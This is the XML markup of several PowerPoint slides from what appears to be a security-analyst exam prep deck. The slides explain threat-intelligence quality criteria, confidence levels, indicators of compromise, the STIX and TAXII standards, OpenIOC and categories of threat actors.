                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Timeliness asks whether the data is recent or current enough to still be actionable since indicators and campaigns change quickly, relevancy asks whether the intelligence actually pertains to your organization's environment, industry, and objectives, and accuracy asks whether the information is correct and free of false positives.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A SOC analyst applies these criteria to filter out stale, irrelevant, or unreliable feeds so that limited detection and response resources are spent only on intelligence that will meaningfully improve defenses.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect scenario questions that ask you to judge an intelligence source on timeliness, relevancy, and accuracy, or to explain why a stale or off-target feed should be discounted.</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192</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide1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INTELLIGENCE SOURCES AND CONFIDENCE LEVELS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Gathering Important Information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Timeliness</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Recent or current data</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Relevancy</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Does it pertain to your objective?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Accuracy</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Is intelligence correct?</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193</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide1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INTELLIGENCE SOURCES AND CONFIDENCE LEVELS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Confidence Levels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A confidence level is a qualitative rating, typically High, Medium, or Low, that expresses how much trust an analyst places in a piece of intelligence and its source.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  It is derived from the underlying evaluation metrics of timeliness, relevancy, and accuracy, effectively summarizing the overall quality and reliability of the information into a single graded assessment.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  The assigned confidence level directly influences the likelihood and aggressiveness of the resulting action, so a high-confidence indicator may justify automatic blocking while a low-confidence one might only warrant monitoring, helping the SOC prioritize and avoid disruptive responses to weak intelligence.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: The exam tests how confidence levels (high/medium/low) are set from timeliness, relevancy, and accuracy, and how they should shape the response an analyst takes.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194</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide1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INTELLIGENCE SOURCES AND CONFIDENCE LEVELS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Confidence Levels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Evaluation metric determined by timeliness, relevancy, and accuracy</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Assessment of information from sources</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Trust of information’s quality</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  High</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Medium</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Low</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Impact likelihood of resulting action</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195</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide1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THREAT INDICATORS AND ACTORS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Indicator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An indicator is the observable result of an event on a network or system that can be used to detect and understand malicious activity, such as a suspicious IP address, file hash, domain, or registry change.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Indicators of Compromise (IoCs) show that an intrusion may have already occurred, while Indicators of Attack (IoAs) reflect behavior suggesting an attack is in progress, and both serve as the raw data points analysts pivot on during detection and hunting.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Because organizations needed a consistent way to document and share these observables, standards emerged so that indicators could be communicated between tools and teams without ambiguity, which is why an analyst cares about representing indicators in a structured form.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect to identify examples of indicators (IP, hash, domain, IoC vs IoA) and to recognize why standardized formats for documenting them are necessary.</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196</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide1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THREAT INDICATORS AND ACTORS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Indicator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Result of an observable event in a network</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Any event used to gain understanding</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Organizations needed to create standards for threat documentation and communication</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197</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide1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THREAT INDICATORS AND ACTORS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Indicator Management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Indicator management is the practice of documenting, standardizing, and sharing threat indicators so they can be consumed consistently across different organizations and security tools.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Structured Threat Information eXpression (STIX), developed by the MITRE Corporation and now maintained by OASIS, is the leading effort to standardize this by defining a common, machine-readable language and data model for describing threats, indicators, and their relationships.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A SOC analyst relies on standards like STIX so that indicators produced by one team or vendor can be ingested and acted on automatically by others, eliminating manual reformatting and enabling scalable threat sharing.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: You should recognize STIX as the standardized language for expressing threat intelligence and associate it with MITRE/OASIS and structured indicator sharing.</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198</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide1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THREAT INDICATORS AND ACTORS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Indicator Management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Structured Threat Information eXpression (STIX)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  MITRE Corporation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Effort to standardize threat data communication and documentation</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199</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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STRUCTURED THREAT INFORMATION EXPRESSION (STIX)</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12 STIX domain objects (SDOs)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STIX Domain Objects (SDOs) are the standardized building blocks in STIX 2.x that each represent a distinct concept in threat intelligence, allowing complex threat information to be modeled in a consistent, machine-readable way.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  The set includes Attack Pattern, Campaign, Course of Action, Grouping, Identity, Indicator, Intrusion Set, Malware, Observed Data, Report, Threat Actor, and Tool (as well as Vulnerability and Malware Analysis in later versions), where for example an Indicator describes a detection pattern, a Threat Actor describes an adversary, and a Course of Action describes a mitigation or response.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  An analyst uses SDOs to structure intelligence so that campaigns, actors, malware, and defenses can be linked together and correlated automatically rather than described in unstructured prose.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: The exam may ask you to match a STIX Domain Object (such as Indicator, Threat Actor, or Course of Action) to the type of threat information it represents.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200</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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STRUCTURED THREAT INFORMATION EXPRESSION (STIX)</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12 STIX domain objects (SDOs)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Attack pattern</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Campaign</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Course of action</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Grouping</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Identity</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Indicator</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Intrusion set</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Malware</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Observed data</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Report</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201</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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STRUCTURED THREAT INFORMATION EXPRESSION (STIX)</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12 STIX domain objects (SDOs)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Threat actor</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Tool</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202</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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STRUCTURED THREAT INFORMATION EXPRESSION (STIX)</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2 STIX relationship objects (SROs)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STIX Relationship Objects (SROs) are the connectors that link STIX Domain Objects together to build a complete, contextual picture of a threat.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  There are two SROs: the Relationship object, which defines a typed connection between two SDOs (for example, an Indicator 'indicates' a piece of Malware, or a Threat Actor 'uses' a Tool), and the Sighting object, which records that something such as an indicator or actor was actually observed or occurred in an environment.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A SOC analyst relies on SROs because isolated indicators have limited value, and it is the relationships and sightings that reveal how actors, campaigns, malware, and observations tie together into an actionable narrative.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect to distinguish the two SROs, knowing that Relationship links two SDOs and Sighting records that something was actually observed.</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203</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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STRUCTURED THREAT INFORMATION EXPRESSION (STIX)</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2 STIX relationship objects (SROs)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Sighting – something has occurred</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Relationship – connection between two SDOs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204</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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STRUCTURED THREAT INFORMATION EXPRESSION (STIX)</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Exchanging Threat Data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Once threat data is structured, it must be transported between parties, and Trusted Automated eXchange of Indicator Information (TAXII) is the application-layer protocol that defines how STIX data is transferred over HTTPS via an API, making STIX intelligence available to other entities through push/subscribe collections and request/response channels.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  OpenIOC is an alternative open-source framework, originally created by Mandiant (later part of FireEye), that provides an XML schema for collecting, documenting, and exchanging indicators of compromise.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  An analyst cares about these transport standards because they enable automated, machine-to-machine sharing of threat intelligence between feeds, TIPs, and security controls without manual handling, which is essential for keeping detections current.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: You should pair STIX with TAXII (STIX is the what, TAXII is the how of transport) and recognize OpenIOC as a Mandiant-originated IoC exchange format.</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205</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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STRUCTURED THREAT INFORMATION EXPRESSION (STIX)</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Exchanging Threat Data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Trusted Automated eXchange of Indicator Information (TAXII)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Defines how STIX data is transferred via API</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Makes STIX data available to other entities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206</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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STRUCTURED THREAT INFORMATION EXPRESSION (STIX)</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Exchanging Threat Data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OpenIOC</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Open-source</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Created by Mandiant (now part of FireEye)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Framework for collecting and exchanging indicators of compromise data</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207</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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STRUCTURED THREAT INFORMATION EXPRESSION (STIX)</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Threat Actors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Threat actors are the individuals or groups that carry out malicious activity, and they are classified by their motivation, sophistication, and resources.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Nation-state actors are highly sophisticated and well-funded, operating on behalf of a government to pursue espionage or strategic goals; hacktivists are individuals or groups pursuing a social, political, or ideological cause through hacking; organized crime groups are financially motivated and frequently deploy ransomware and fraud; and insider threats are people with legitimate access who act maliciously, in this case intentionally, against the organization.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A SOC analyst profiles threat actors because understanding an adversary's motive, capability, and typical tactics helps predict what they will target and how, which shapes detection priorities and defensive posture.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
